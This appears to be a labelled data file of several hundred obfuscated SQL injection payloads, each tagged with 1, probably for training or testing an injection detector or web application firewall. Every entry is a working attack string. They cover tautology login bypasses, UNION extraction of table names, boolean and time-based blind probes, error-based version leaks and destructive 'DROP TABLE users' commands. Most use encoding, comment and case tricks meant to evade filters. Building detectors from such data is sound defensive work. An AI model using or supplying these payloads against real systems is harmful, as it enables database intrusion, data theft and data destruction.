"admin%27%20OR%20%271%27%3D%271%u0020/*!*/AND%u00201=1", 1
"%27UNIONSELECTnull%2Cnull%2Cnull--%0A", 1
"waITfOR%u0020dElAY%u0020%u00270:0:5%U0027--", 1
"%27%%320UNIO%4e%20SELE%43T%201%2C2%2%433%20OR%20%27b%27%3D%27b%27-%2d", 1
"%27%20oR%20%271%27%3d%271", 1
"%27%2F%2A%2A%2For%2F%2A%2A%2FexIsTs%28SeLeCT%2F%2A%2A%2F1%2F%2A%2A%2FFRoM%2F%2A%2A%2Fusers%29----H5MGFkG36EH3MI", 1
"1' OR a%73cii(%73ubs%74ring(database(), 1, 1%29) > 100 -%2d", 1
"1/*!12345*/AND			1 >= 1#rpwrjm42nktf", 1
"1%09%0%39%09%%309%0%39AND%09%09%09%0%39%091> =%201", 1
"%27%20OR%%320%271%27%%33D%271", 1
"%27%20OR%20EXISTS%28SEL/*!12345*/ECT%201%20FROM%20users%29----tcktxh", 1
"'%20%20%20O%52%20'1' LIKE%20'1", 1
"1AND", 1
"1	%3d%091/*%0a*%2f", 1
"WAITFORDELAY'0:0:5'--/*%0a*/", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020%u0020#%u0020more_noise--", 1
"%27%20and%20eXtRAcTVALuE%281%2CCOnCaT%280X5c%2cVERSION%28%29%29%29%20%2f%2a%21%2a%2fAnd%201%3d1--", 1
"%u0027%u0020OR%u0020EXISTS(SEL/*!12345*/ECT%u00201%u0020FROM%u0020users)--", 1
"%27%2520%2520%2520%2520AND%2520%2520%2520%25201%20%20%3D%2509convert%28int%2C%40%40version%29%20OR%20%281%29--#9uuyuc0upsf1pib", 1
"test%27%20OR%20%271%27%3C%3D%271%27%20--%20--agz9yn", 1
"%3B%2520%2520%2520%2520SELECT%2520%2520%2520%2520pg_sleep%285%29%3B%2520%2520%2520%2520--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20--#ftlrjnwvu5grxy", 1
"WAITFORDELAY", 1
"%u00270:0:5%u0027 OR 'b'='b'--%0d%0a", 1
"1%27%%320O/*!12345%2a/%52%20%49F%28substring%28da%74ab%61se%28%29%2C%201%2C%201%29%3%44%27a%27%2C%20SLE%45P%28%35%%329%2C%200%29%20--", 1
"1))/*!%312345*/ U%4eIon  sel%45CT  1%2cdATabASE(),3-%2d", 1
"%27%20OR%201%3E%3D1%20--%20", 1
"1' XOR asc%69i(%73%75bst%72ing(database()%2c 1, 1)) > 100 --", 1
"WAITFOR/**/DELAY				'0:0:5'----lp8yp3kl5", 1
";DROP%0aTABLE/*%0d%0a*/users;--/*%0d%0a*/", 1
"%u0027/**/OR%u00201%3D1%u0020%u0020/*!*/AND%u00201%3D1--%u0020", 1
"' || EXISTS(SELECT 1 FROM users)--", 1
"t%65%73t'OR/%2a%0a*/'1'='1'%0d%0a%2f*%0d%0a", 1
"; dRop taBlE usErS; --", 1
"%27%2F%2A%2A%2FOR%2F%2A%2A%2F%2531%3D1%2F%2A%2A%2F%252d-%2F%2A%2A%2F", 1
"test'OR", 1
"'1'LIKE'1' OR 'b'='b'--", 1
"test%27OR%271%27%3D%271%27%2F%2A%250d%250a%2A%2F%2F%2A%2F%2A%250a%2A%2F", 1
"%u0027%u0020||%u00201LIKE%31%u0020-%2d%u0020", 1
"%2527OR%2F%2A%250A%2A%2F%25271%2527%253D%25271%250A", 1
"'OR%0aEXISTS(SELECT1", 1
"FROMusers)--", 1
"admi%6e' OR '1'>=%271", 1
"1'UNIO%4eSELECTtable_name%2cnull,null/%2a%0a%2a/FROM/*%0a*/in%66orm%61ti%6f%6e_sch%65ma.tables--/*%0d%0a*/", 1
"1' OR If(SuBsTRiNG(dAtABasE(), 1, 1)='A', SleEP(5), 0) --", 1
"Te%73t'%09Or%09'1' =%09%271'%%309/*", 1
"%u0027AND/*%0a*/1=c%6fnvert(%69nt,@@versi%6fn)-%2d", 1
"%U0027%u0020aNd%U0020EXTraCtVALUe(1,concAT(0X5C,VeRSion()))--", 1
"test'/**/OR/**/'1'	=%20'1'/**//*", 1
"%27%2F%2A%2112345%2A%2FOR%201%3D1%20 AND 'a'='a'--%20", 1
"%u0027%u0020AND%u00201=convert(int,@@version)----9f1k6wowz5", 1
"%27%20O%52%%320EXISTS%28SEL%45CT%201%20FRO%4d%20users%29-%2d", 1
"%27OREXISTS%28SELECT%250d%250a1FROM%2F%2A%250d%250a%2A%2Fusers%29/*!12345*//*!*/AND 1=1--", 1
"%27%2F%2A%2A%2FaNd%201%3DconveRT%28InT%2C%40%40VERsioN%29--", 1
"1'%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--", 1
"'OR/*%0d%0a*/EXISTS(SELECT1FROMusers)--", 1
"te%73t' XOR '1%27<='1'%20/*", 1
"1)/**/UnIon%20%53elECT 1,%64at%61BAse(),3--", 1
"%27%20UN%49ON%20S%45LECT%20nu%6cl,%20null,%20null%20--%20", 1
"1))UNion%0aSeLeCt1,DAtabAsE(),3/*!*/AND1>=1--", 1
"1%27/**/OR/**/iF(subSTRiNg(DatABase(),/**/1,/**/1)%3D%27A%27,/**/SLEEp(5),/**/0)/**/----kes3bpt", 1
"' or 1=1 --", 1
"' anD ExtRAcTVAlUe(1,COnCAT(0x5C,VersIoN()))--#yafu4e1hshsihxw", 1
"tesT%27%20%7c%7c%20%281%3d1%29%271%27%3D%271%27%20--%20", 1
"1%27%2F%2A%2A%2FAnd%2F%2A%2A%2FsUBsTRiNG%28DaTaBAsE%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%2F%2A%2A%2F%3E%3D%2F%2A%2A%2F%27s%27%2F%2A%2A%2F--", 1
"1))UNION/*%0d%0a*/SELECT/*%0d%0a*/1,database(),3--", 1
"%u0027/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)--", 1
"1/*!*/AND%201=%31#l5s%30ent", 1
";%20DROP%u0020TABLE%u0020u%73ers%3b%u0020%u0020AND%u0020%u0027a%u0027>=%u0027a%u0027--", 1
"'/**/OR 1>=1 --", 1
"%27%20%20%20%20%20AND%20%20%20%20%201%20%20%3D%20%20convert(int,@@version)%20%20%20%20%20#%20%20%20%20%20more_noise--", 1
"' && 1=convert(int,@@version) OR 'b'='b'--", 1
"' OR 1=1  AND 'a'='a'--", 1
"admin%27%20OR%20%271%27%3D%2%371 -- rand%6f%6d%5fnoise--r925ke7os8a", 1
"; S%45LECT pg_sleep(5); %20/*!*/AN%44 1=1%2d-", 1
"'UNION/*%0d%0a*/SELECT/*%0d%0a*/1,2,3--%0d%0a", 1
"1%2527%2520UNIOn%2520SEleCt%2520tabLE_NAME%2C%2520null%2C%2520nULL%2520frOm%2520inFORmATioN_scHeMa.TAblEs%2520--", 1
"1%27%2509%2509%2509O/*!*/R%2509%2509%2509ascii%28substring%28database%28%29%2C%2509%2509%25091%2C%2509%2509%25091%29%29%2509%2509%2509%3E%2509%2509%2509100%2509%2509%2509--", 1
"1A/*!*/nD%0d%0A1=1/*%0A*/#8d5kt3m6auo", 1
"%27%20unIon%20sELEct%20NuLL,%20nULl,%20nULL%20--%20", 1
"1%20AND%201%3D1#9wpqw6", 1
"1%20AND%201%3D1 AND 'a'='a'", 1
";/*!*/DROP  TABLE  users;  --", 1
"%27OR%271%27%3D%271%0d%0aAND%27a%27%3D%27a%27/*%0d%0a*/", 1
"%27%20OR%20%271%27%3D%271 -- random_noise", 1
"%2527%2520UN/*!*/ION%2520SELECT%25201%2C2%2C3--", 1
"' %4fR%20'1'='1#hd9amckaxic8i2r", 1
"1'/**/Or/**/AscIi(SubSTriNg(dATAbASe(),/**/1,/**/1))/**/>/**/100/**/--", 1
"%31%27%20%4fR%20IF%28subst%72ing%28database%28%29%2C%20%31%2C%201%29%%33D%27a%2%37%2C%20S%4cEEP%285%2%39%2C%200%2%39%20--", 1
"test'/**/OR '1'>='1'  OR (1)-- --fhb0fwxd03au5r3", 1
"%u0027%u0020Or%U0020%u00271%u0027=%U00271%u0020/*!*/anD%U00201=1", 1
"test'  OR  '1'%20=%09'1'  --  #mfmotpvtvxgth1", 1
"' aND exTRActVAlue(1,ConCaT(0X5C,versiOn()))--", 1
"'AND1=conv%65rt(int,@@ver%73i%6fn)--/*%%30a*/", 1
"%27/*!12345*/And%201%3DCOnvErt(Int,@@veRsion)--", 1
"%2527%2520AND%25201%253E%253Dconvert%28int%2C%40%40version%29--", 1
"tEST' OR '1'='1' /*", 1
"'  ANd  1In  (1)1  --  #59MEgnhD", 1
"%27AND1%3D1%23%2F%2A%250a%2A%2Fmore_noise--%2F%2A%250a%2A%2F%0A", 1
"test' OR '1'='1' /*--s5jxu5g", 1
"TeSt' OR '1'='1' /*", 1
"1)  UNION  SELECT  1,database(),3--", 1
"1%u0027%u0020O/**/R%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--", 1
"'%20%20AND%20%20extractvalue(1,concat(0x5c,version()))%20%20/*!*/AND%20%201IN%20%20(1)1--", 1
"test' OR '1'='1'  /*!*/AND 1=1--", 1
"%27%20or%20%271%27%3D%271", 1
"1'%09%09%09%09UNION%09%09%09%09SELECT%09%09%09%09table_name,%09%09%09%09null,%09%09%09%09null%09%09%09%09FROM%09%09%09%09information_schema.tables%09%09%09%09--", 1
"%27And%250d%250a1%3DcOnVERT%28int%2C%40%40VerSIon%29%2F%2A%250a%2A%2F--%250d%250arandom_noise--", 1
";SELECTpg_sleep(5);--/*%0d%0a*/", 1
"WAITFO/*!12345*/R%2F%2A%2A%2FDELAY%2F%2A%2A%2F%25270%3A0%3A5%2527--", 1
";/**/SELECT/**//**//**//**//**/pg_sleep(5);/**//**//**//**//**/--", 1
"1 AND 1=1 /*!*/AND 1=1", 1
"%27%%320OR%20%45XISTS%28SE%4cECT%20%31%20F%52OM%20users%29--#y8su7f7p%77bbspwi", 1
"'OR/*%0a*/1<=1", 1
"--", 1
"%%327%20AND%20ex%74r%61ctvalue(%31,concat%28%30x5c,ver%73ion()))----wr05h6cvwnexe9", 1
"WAITFORDELAY%0d%0a%270:0:5%27--%0d%0a", 1
"%u0027%u0020O/*!12345%2a/R%u0020%u00%32%371%u0%3027=%u002%371", 1
"%27%20%20%20%20OR%20%20%20%201%20%3D%201%20%20%20%20--%20%20%20%20--3w56qcy69li", 1
"%61d%6din%u0027%u0020OR%u0020%u00271%u0027=%271%u0020OR%u0020%u0027b%u0027=%u0027b%u0027#%70if7mwg8cu9%74", 1
"1'/*!*/XORIF(substring(database(),/*%0d%0a*/1,1)='a',SLEEP(5),0)----pmw9wv2dpor58/*%0d%0a*/", 1
"1%2529%29%20U%254eIO%254e%20SE%254cECT%201%2Cdatabase%28%29%2C3--", 1
"%27%20AND%20e%78tractva%6cue%281%2Cconcat%2%380x5c%2Cversio%6e%2%38%29%29%%329 AND 'a'='a'--#m9l52i9", 1
";/**/SELECT        pg_sleep(5);                OR        'b'	= 'b'--", 1
"1'/*!*/         AND          substring(database(),          1,          1)          %09LIKE%09          's'          --", 1
"'UNIONSELECTnull,null,null OR 'b'='b'--%0a", 1
"1' aNd sUBSTRINg(DATABase(), 1, 1) = 's' --", 1
"' OR '1'='1--jjkz1", 1
"1' UNIOn select TAble_name, nUll, nUlL FrOM InfoRMAtion_schema.tABLEs --", 1
"'AND/*%0a*/1=convert(int,@@version) -- random_noise--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A--navv596t23", 1
"%27 %4fR '1'='1", 1
"1'/**/O%52/**/IF(subst%72ing(database(%29,/**/1,/**/1)%3d'a'%2c/**/SLEEP(5),/**/0)/**/-%2d", 1
"%3B%2F%2A%2A%2FDROP%2F%2A%2A%2FTABLE%2F%2A%2A%2Fusers%3B%2F%2A%2A%2F--%236gf69mk042rz", 1
"' AND 1<=convert(int,@@version) # more_noise--", 1
"1%2%30AND%201%3D%31/**//*!*/AND 1=1", 1
"test'OR/*%0a*/'1'<='1'%0d%0a/*OR%0d%0a'b'='b'", 1
"1'%%309%0%39AND%09%09substring(database(%29,%09%091,%%309%09%31)%09%0%39%%309<=%20%09%09's'%09%09--", 1
"admin%u0027/**/OR/**/%u00271%u0027>=%u00271", 1
"test'/**/OR/**/'1'%09= '1'/**//*/**/#/**/more_noise", 1
"%61dmin%27%2%30OR%20%271%2%37%3D%271", 1
"' aNd 1=COnVert(iNT,@@veRSION)--", 1
"1'%09%09%09%09AND%09%09%09%09substring(database(),%09%09%09%091,%09%09%09%091)%09%09%09%09>	=%20%09%09%09%09's'%09%09%09%09--", 1
"'/*!12345*/anD 1IN (1)1 --", 1
"'OR/*%0a*/'1'='1/*%0d%0a*/", 1
"%27%20or%20eXISts(SeLecT%201%20fRoM%20users)--", 1
"%27%20O/**/R%20%271%27%3D%271", 1
"; droP taBLE UseRs; --", 1
"' UNIO%4e SELECT 1%2c2,3-%2d#n3f9ddyhrdp", 1
"%27AND%250d%250a1%3Dconvert%28int%2C%40%40version%29--%250d%250a", 1
";%20SELECT%20pg_sleep(5);%20%20AND%20%27a%27%3D%27a%27----2w6nwox95mlj", 1
";DROPTABLE%0ausers;/*%0a*/--/*%0d%0a*/", 1
"1 AnD 1=%31--qummfj8", 1
"1'/**/or/**/ASCIi(SubstRiNg(dATaBASe(),/**/1,/**/1))/**/>/**/100/**/ OR 'b'='b'----TZZFgKDmM7EA4", 1
"' UNION SELE%43T %31,2,3%2d-#9ekgqjm2zyaol9", 1
"'%20%20%20%20%20AND%20%20%20%20%201=1%20%20%20%20%20--%20%20%20%20%20%0d%0a", 1
"WAITFOR/*!12345*/DELAY/**/'0:0:5'/**/XOR/**/(1)--", 1
"1AND%0d%0a1=1%0d%0a#6uptads", 1
"te%73t'/**/OR/**/'1'=%271'/**/%2f%2a#j18g86f5a5", 1
"%31' OR IF(sub%73tring(%64atabase(), 1, 1%29='a', S%4cEEP(5)%2c 0) --", 1
"%27%20Union%20selECT%20nUlL%2C%20NUlL%2C%20nuLl%20--%20", 1
"'			AND			1%20=%20convert(int,@@version)--", 1
"%3b%20DROP%20TaBlE%20userS%3B%20--", 1
"admin'%09%09%09%09OR%09%09%09%09'1'%09=%20'1", 1
"' || 1>=1  /*!*/AND 1=1-- #ycdueukw", 1
"%27%09%09%09AND%09%09%09extractvalue(1,concat(0x5c,version()))--", 1
"1))union%0asElECT/*%0d%0a*/1,DATaBase(),3--%0d%0A", 1
"%27/**/A%4eD/**/1%09>=	1/**/--/**%2f", 1
"1%u0027ORIF(substring(database(),1,1)=%u0027a%u0027,/*%0d%0a*/SLEEP(5),0)/**/#/**/more_noise--", 1
"wAITfor%u0020DeLay%u0020%u00270:0:5%u0027--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027%3D%u00271", 1
"admin'OR%0a'1'='1%0d%0a", 1
"%3B%20DROP%20TABLE%20users%3B%20%20OR%20%281%29--", 1
"'/**%2fUNI%4fN SELEC%54 null, n%75ll, null --", 1
";/**/%44ROP/**/TABLE/*%2a/%75sers;/**%2f--", 1
"; seLecT Pg_slEep(5); --", 1
"'/*!*/AND				1%09=  1				--", 1
"aDMiN'/*!12345*/or '1'='1", 1
"%27 Or '%31'<='1", 1
"admin%27%2509OR%2509%271%27%20%3D%09%271", 1
"1%20and%201%3D1", 1
"%27/*!12345*/AND%20%65xtractvalue(1,%63oncat(0x5c,v%65%72s%69on()))--#14pvxnrld2lt2", 1
"%31)) UNION S%45LECT 1,d%61tabase()%2c3--", 1
"1' OR AsciI(SuBsTRIng(dAtAbaSE(), 1, 1)) > 100  or 'b'iN (1)'b'--", 1
"1%2527%2520OR%2520IF%28substring%28database%28%29%2C%25201%2C%25201%29%253D%2527a%2527%2C%2520SLEEP%285%29%2C%25200%29%2520%20--%20random_noise--", 1
"1%u0027%u0020UNION%u0020SE%4cE%43T%u0020table_na%6de,%u0020null%2c%u0020null%u0020FR%4fM%u0020informat%69on_schem%61.tab%6ces%u0020--", 1
"'OREXISTS(%53ELE%43T1%20FROM%20users)--%2d-dpbfjbfhfs/*%0a*/", 1
"1'			UNioN			SelecT			TaBlE_NAme,			nULl,			nULl			FroM			INFoRmATiOn_sCHema.TABLEs			----2uwk9s3985xilk5", 1
"%27/*!12345*/OR%201%3D1%20--%20", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20%20AND%20%27a%27%3D%27a%27--%23neuszm2", 1
"1%27 XOR s%75bstr%69ng(%64atabase(%29, 1, 1) = 's%27  --%20random_noise--#s2%36fdt3rfl8sc", 1
"1' OR AscIi(sUbsTring(dAtabaSe(), 1, 1)) > 100  and 'a'='a'--", 1
"'/**/and 1=cONvErt(iNt,@@VErSioN)----7vh2823pt", 1
"ADMiN'			or			'1'=%09'1%0a", 1
"1AND%250a1%3C%3D1", 1
"admin'/**/O/**/R/**/%271'	=%%320'1", 1
"' AND 1=convert(int,@@version) OR (1)--", 1
"1))/**/UNION/**/SELECT/**/1,database(),3#/*%0d%0a*/more_noise--", 1
"", 1
"t%65st'/*!*/OR%20'1'IN (1)'1' /*", 1
"WAITFOR %44ELAY '0:%30:5'%2d-", 1
";%U0020sElect%U0020pg_sLEEP(5);%u0020%U0020OR%u0020(1)--", 1
"'/*!12345*/OR 1>=1 --", 1
"1'/**/Or/**/if(SUBStriNG(DatABASE(),/**/1,/**/1)='a',/**/SLEEp(5),/**/0)/**/--", 1
"1&&", 1
"1=1/*%0d%0a*/", 1
"%27%20XOR%20EXISTS(SELECT%201%20FROM%20users)--", 1
"' uNION SELecT nulL, nUll, Null --", 1
"'/**/XOR/**/EXISTS(SELECT/**/1/**/FROM/**/users) OR 'b'='b'--", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020--%25u0020", 1
"'%20UNio%4e sElEct NuLl%2c NUll, %6EuLl -- #17ZGqHejXSOlTdS", 1
"test%27%20%20%20%20OR%20%20%20%20%271%27%20LIKE%09%271%27%20%20%20%20/*#kjmlco4l4", 1
"1%27%20O/**/%52%20IF%%328su%62string%2%38database%28%29%2C%%3201%%32C%%320%31%2%39%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"1' %41ND%20substring(database(), 1, 1%29 %3d %27s' --", 1
"%27%20OR%20EXISTS%28SEL/*!12345*/ECT%201%20FROM%20users%29--", 1
"admin%27Or%0a%271%27%3D%271%0d%0a", 1
"1'  OR  IF(substring(database(),  1,  1)  =%09'a',  SLEEP(5),  0)  ----2knigymg3uebk", 1
"WAITFO%52%20D%45LA%59%20%270:0:5%27--", 1
"%27%20OR%20EXISTS%28SELECT%201%%320%46ROM%20u%73e%72s%29-%2d", 1
"1))				UNION				SELECT				1,database(),3				OR				(1)--", 1
";%U0020dRoP%U0020tAbLe%u0020uSErS;%u0020--", 1
"%27%20%20OR%20%20%271%27%20%3D%09%27%31", 1
"%27%20OR%20EXISTS(%53EL%45CT%201%20FR%4fM%20us%65rs)--#uphno1", 1
"%27%20or%20%271%27%3d%271--4e8r7", 1
"%27%20Or%201%3d1%20--%20", 1
"' %4fR 1<=1 -%2d #76r1oygqx", 1
"1%29%29%2555NION%250d%250aSELE%2543T%2531%2Cdata%2562ase%28%29%2C3--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  OR 'b'='b'--#cl47aobdmxu", 1
"' UNION SELECT 1,2,3--#ewxpwywi", 1
"adMIn%27%2F%2A%2A%2FOr%2F%2A%2A%2F%271%27%3D%271", 1
"%u0027				OR				1%u0020%3D%u0020%u00201				--", 1
"admin%27					OR					%271%27%20%3D%09%271", 1
"'/%2a!12345*/AND/**/1=conv%65rt(int,@@vers%69o%6e%29--", 1
"1%29%29%2F%2A%2112345%2A%2FUNIoN%20SeLeCt%201%2CDATabaSe%28%29%2C3%20%23%20more_noise--", 1
"1%27%20O/*!*/R%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20%20OR%20%281%29--", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20--%20--2vh6xoiki", 1
";%20%20%20%20SELECT%20%20%20%20pg_sleep(5);%20%20%20%20----o6ums1xhdx7", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29----ny3h52cicv5vs", 1
"1)%u0020unION%U0020selECT%U00201,DaTaBASe(),3--", 1
"'%20OR EXISTS(SELECT 1 FROM users)--%23%71l%31h%38", 1
"%u0027%09%09%09%09AND%09%09%09%091	=%09convert(int,@@version)%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--", 1
"1%27%20O/**/R%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"waItFOrDElay/*%0a*/'0:0:5'--", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--", 1
"'/**/OR/**/'1'='1 AND 'a'='a'", 1
"1%27%20O/*!*/R%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20 AND 'a'>='a'--", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2F1%2509%3D%2509convert%28int%2C%40%40version%29%2F%2A%2A%2F--%2F%2A%2A%2Frandom_noise--", 1
";DROP/*%0d%0a*/TABLE", 1
"users;--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20%20#%20more_noise--", 1
"'/**/|| (1=1)EXISTS(SELECT 1 FROM users)--", 1
"%27%2F%2A%2A%2FoR%20%271%27%3D%271", 1
";/*!12345*/SEleCT pg_sLeep(5); --", 1
"WAI%2554FOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%25270%3A0%3A5%27%252d-", 1
"a%64min' OR '1'='%31", 1
"%27%2F%2A%2112345%2A%2FAND%201%3D1%20--%20", 1
"' AND extractvalue(1,%63o%6ecat(0x5c%2cv%65rsio%6e())) /*!*/AND 1=1--", 1
"1))%20UniOn%20SeleCt%201,DatAbAse(),3--", 1
"1) UNION SELECT 1,database(),3--#abm6li8", 1
"%u0027%u0020OR%u0020eXIStS(s%45lECT%u0020%31%20%46roM%u0020userS)--", 1
"; %53%45LECT pg_s%6ceep(5); --", 1
"1%2527%2520OR%2520IF%28s%2575b%2573tring%28data%2562ase%2528%29%2C%2520%2531%2C%25201%29%253D%2527a%2527%2C%2520SLEEP%285%29%2C%25200%29%2520--", 1
"'OR1=1/*%0a*//**/AND 'a'='a'--", 1
"; SELECT pg_sleep(5);  OR (1)--", 1
"1'%20aND S%75bsTRIn%67(dat%61baS%65(), 1, 1) = 'S' --", 1
"t%65%73t' OR '1'='1'%20--", 1
"test%27%20OR%20%271%27%3E%3D%271%27%20%2F%2A", 1
"'%20%20AND%20%201	=%09convert(int,@@version)--", 1
"%27%20XOR%20%271%27LIKE%271", 1
"1%29%29UNION", 1
"SELECT1,databa%73e(),3--/*%%30d%0a*/", 1
"'%20AND 1=convert(in%74,@@vers%69on%29----8i5b0ycocm", 1
"%27%20anD%20ExTrActvAlUe%281%2cCONCat%280x5c%2cVerSioN%28%29%29%29--", 1
"1))UNION/*%0a*/SELECT1,database(),3OR(1)--", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20#2ilywh448q7", 1
"' uNIoN sEleCT 1,2,3--", 1
"%27%2F%2A%21%2A%2FU%254eION%20%2553ELEC%2554%20%256eull%2C%20null%2C%20null%20--%20", 1
"%27%20OR%20%27%2531%27%3D%271%20%254f%2552%20%27b%27%3D%27b%27", 1
"' UNION SELECT 1,2,3----nxdscq4oazjj", 1
"1' UNI%4fN SE%4cECT %74able%5fnam%65%2c null, null F%52OM in%66ormation_schema.tables --", 1
"admin%27%20%7C%7C%20%271%27%3D%271", 1
"adMin%27%20or%20%271%27%3d%271", 1
";/*!*/SElEcTPG_slEeP(5);----88nQ2Itn%0a", 1
"%3B%25U0020SeLEct%25u0020Pg_SLEep%285%29%3B%25U0020--", 1
"1))UNIONSELECT1,database(),3--/*%0a*/", 1
"1))/*!12345*/UNION SELECT 1,database(),3--#lfnmf2", 1
"1))%20Un/*!*/Ion%20sEleCT%201,DatabASE(),3--", 1
";  SELECT  pg_sleep(5);  --", 1
"'/**/UNION%2f**/SELECT/**/nu%6cl,/**/nu%6cl,/**%2fnull/*%2a/--/*%2a/", 1
"' && (1IN (1)1)1=1 --", 1
"%u0027%u0020And%u0020ExtRacTvAlUE(1,coNcAT(0X5C,VerSioN()))--#4C4rT7QGYSXJS6R", 1
"%27%20AnD%201%3DCoNVERt(int,@@vErsion)--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  OR 'b'='b'--#anw4s72h7o", 1
"%u0027%u0020OR%u0020%u00271%u0027/**/=/**/%u00271", 1
"' AND%201=conver%74(int,@@v%65%72sion)--", 1
"1'/**/UNION%2f**/%53ELECT%2f**/tabl%65_name,/**/null%2c/**/n%75ll/**/FROM/**/%69nformation_s%63hema%2et%61bles/%2a*/ -- random_n%6fise----yw75yus%30t", 1
"1%u0027/*!*/||%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--", 1
"1'UNIONSELECT", 1
"table_name,null,nullFROMinformation_schema.tables--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  /*!*/AND 1=1--", 1
"1))/**/Un%49On SElect 1,D%61taBa%73%65(),3--", 1
"1%27/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/%3E/**/100/**//**//*!*/AND/**/1%3D1--", 1
"tESt%27%20oR%20%271%27%3D%271%27%20 -- random_noise--%20", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/* /*!*/AND 1=1", 1
"TESt%27%20or%20%271%27%3d%271%27%20--%20#D2WXw9i23Z8", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----kvr3cjh", 1
"1%27ORasci%69(substrin%67(data%62as%65(),/*%0d%0a*/1,%2f*%0d%0a*%2f1))%3E10%30%0a--", 1
";%u0020DroP%u0020tablE%u0020usERs;%u0020--", 1
"' AND 1=1  AND 'a'='a'--", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27 -- random_noise--", 1
"'OR/*%0d%0a*/'1'='1/*%0d%0a*/--jsfbkvy7tk4", 1
"1' AND%20substring(dat%61base%28),%201%2c 1) = 's' --", 1
"'/**/UNI%4fN/**/SE%4cECT/**/null,/**/nul%6c%2c/**/null/**/--/**/", 1
"1%27%20AND%20su%62string%2%38database%28%%329%2C%20%31%2C%2%301%29%20%3D%2%30%27s%%327%20--", 1
"1'/**/UNION     SELECT     table_name,     null,     null     FROM     information_schema.tables     --", 1
"' And 1=CoNvert(InT,@@VerSioN)--", 1
"%3B%20SELECT%20%2570g%255fsleep%25285%29%3B%20--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)----adbd2imxb5ijkk", 1
"1)) UNION SELECT 1,database(),3----1bb4xg7to", 1
"1' A%4ed SUBStRIng(dat%41BASe(), 1, 1) >= 's' ---%2d4d5u%683qc%6ckg%61", 1
"%27%2F%2A%2A%2FOR%20EXISTS%28SELECT%201%20FROM%20users%29--%23lsrf5za4", 1
"test%27%20OR%20%271%27%3D%271%27%20/* /*!*/AND 1=1", 1
"%25U0027%25u%2530020OR%25u%2530020%25U00271%25u0027%3d%25%25750027%2531", 1
"1'%09%09%09UNION%09%09%09SELECT%09%09%09table_name,%09%09%09null,%09%09%09null%09%09%09FROM%09%09%09information_schema.tables%09%09%09--", 1
"1%20%26%26%201%3D1#2pkj7", 1
"'AND", 1
"1IN(1)1/*%0a*/--%0a#rubrwnfyyt024", 1
"%u0027/*!*/OR%u0020%u00271%u0027=%u00271 AND 'a'='a'", 1
"1%U0%3027%U%3002%30A/**/n%44%U%30020%73uBstRiNg(DaTaBAse(),%%7500%3201,%u00201)%u0020=%U0020%%750027S%u0027%U0020--", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29----jalikz", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  OR 'b'='b'--", 1
"test%u0027O/**/R%u00271%u0027<=%u00271%u0027/*%0d%0a*//*", 1
"tEST%u0027/**/Or/**/%u00271%u0027=%u00271%u0027/**/--/**/", 1
"1%u%30027%u0020UNION%%750020SELECT%u%30020%74%61ble%5fnam%65,%u0020null,%u0020null%u002%30FROM%u0%3020information_%73chema.table%73%u0020--#043u4ay%31p", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--", 1
"%27%20UNION%20SELECT%201,2,3 OR (1)--", 1
";%20dRop%20TaBLe%20USErs;%20 -- RANdom_NOISE--", 1
"1%25u0027%25u0020AND%25u0020substring%28database%28%29%2C%25u00201%2C%25u00201%29%25u0020%2509%3D%2509%25u0020%25u0027s%25u0027%25u0020--", 1
"'     XOR     1  =	1          AND     'a'  =	'a'--", 1
"tes%74' OR%20'1'=%271' --", 1
"test'/*!12345*/ OR  '1'  =	'1'  /* OR 'b'='b'", 1
"%2527%20OR%20EXISTS%28SELECT%201%20F%2552OM%20use%2572s%2529--", 1
"%3b%20selEcT%20pg_SLeeP%285%29%3b%20--", 1
"%u0027aNdextRACtVAlUe(1,Concat(0X5C,Version()))--%0a", 1
"1A/*!12345*/ND%0d%0a1%09=%09%31", 1
"1%27%20O/*!*/R%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--", 1
"%27%20%26%26%20%281%3d1%29ExTRACtValUe%281%2CconCat%280X5c%2CvErsIon%28%29%29%29--", 1
"%u0027/*!12345*/AND%091	=%20convert(int,@@version)--", 1
"'/**/&&/**/(1>=1)1=1/**/--/**/", 1
